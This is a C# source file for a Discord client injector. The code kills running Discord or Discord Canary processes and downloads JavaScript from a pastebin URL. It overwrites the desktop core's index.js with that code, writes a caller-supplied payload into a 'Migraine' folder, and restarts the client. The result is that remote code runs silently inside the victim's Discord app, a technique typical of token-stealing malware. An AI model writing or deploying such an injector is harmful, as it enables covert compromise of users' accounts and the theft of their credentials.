 public class ClientInjector
    {
        public Injection Settings { get; set; }
        public ClientInjector(Injection properties, bool InjectOnCreation = false)
        {
            Settings = properties;

            if (InjectOnCreation)
            {
                Inject();
            }
        }
        public bool Inject(bool Restart = true)
        {
            try 
            {
                var _Process = GetDiscordProcesses();
                var DriveLetter = GetDriveInfo(new FileInfo(GetProcessPath(_Process[0].Id)));
                var CanaryVersion = "0.0.263";
                var DiscordVersion = "0.0.306";
                var path = _Process.First().ProcessName.Contains("Canary") ? $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Roaming\\\\discordcanary\\{CanaryVersion}\\modules\\discord_desktop_core" : $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Roaming\\\\Discord\\{DiscordVersion}\\modules\\discord_desktop_core";
                if (Settings.KillDiscord) _Process.ForEach(x => x.Kill());
                var InjectionCode = new WebClient().DownloadString("https://pastebin.com/raw/BcNtAqtQ");
                var Branch = _Process.First().ProcessName.Contains("Canary") ? "discordcanary" : "Discord";
                var BranchVersion = Branch == "discordcanary" ? CanaryVersion : DiscordVersion;
                var DiscordPath = $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Local\\Discord\\app-{DiscordVersion}\\Discord.exe";
                var DiscordCanaryPath = $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Local\\DiscordCanary\\app-{CanaryVersion}\\DiscordCanary.exe";
                var FixedDirectoryOfInjection = DriveLetter + @"\Users\\" + Environment.UserName + @"\\AppData\\Roaming\\\\" + Branch + @"\\" + BranchVersion + @"\\modules\\discord_desktop_core";
                InjectionCode = InjectionCode.Replace("directoryofinjection", FixedDirectoryOfInjection + @"\\Migraine");
                Directory.CreateDirectory($"{path}\\Migraine");
                File.WriteAllText($"{path}\\index.js", InjectionCode);
                File.WriteAllText($"{path}\\Migraine\\payload.js", Settings.Payload);
                if (Restart) Process.Start(Branch == "discordcanary" ? DiscordCanaryPath : DiscordPath);
                return true;
            }
            catch(Exception)
            {
                return false;
            }
        }

        private static DriveInfo GetDriveInfo(FileInfo file)
        {
            return new DriveInfo(file.Directory.Root.FullName);
        }

        private List<Process> GetDiscordProcesses()
        {
            return Process.GetProcesses().Where(x => x.ProcessName.StartsWith("Discord") && !x.ProcessName.EndsWith("Helper")).ToList();
        }

        private string GetProcessPath(int id)
        {
            string result;
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select ExecutablePath from Win32_Process where ProcessId = " + id.ToString()))
            {
                using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                {
                    result = (from ManagementObject mo in managementObjectCollection select mo["ExecutablePath"]).First<object>().ToString();
                }
            }
            return result;
        }

    }

    public class Injection
    {
        public bool KillDiscord { get; set; }
        public string Payload { get; set; }
        public bool ExecuteOnLoad { get; set; }
        public Injection(bool kill, string code, bool executeOnLoad)
        {
            KillDiscord = kill;
            Payload = code;
            ExecuteOnLoad = executeOnLoad;
        }
    }
